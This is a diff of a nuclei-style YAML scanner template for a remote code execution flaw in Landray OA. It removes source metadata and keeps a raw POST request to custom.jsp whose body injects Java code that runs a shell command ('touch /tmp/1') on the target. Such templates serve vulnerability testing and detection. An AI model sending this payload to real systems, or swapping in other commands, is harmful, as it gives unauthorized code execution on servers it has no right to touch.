@@ -3,22 +3,14 @@ info:
   name: 蓝凌 oa sysSearchMain.do 远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lsp7nwlzdqhlans2
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: lsp7nwlzdqhlans2
-    fofa: 暂无
 http:
 - raw:
   - 'POST /sys/ui/extend/varkind/custom.jsp HTTP/1.1
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     var={"body":{"file":"/data/sys-common/datajson"}}&s_bean=sysFormulaValidateByJS&script=new java.lang.ProcessBuilder[''(java.lang.String[])'']([''sh'',''-c'',''touch /tmp/1'']).start();
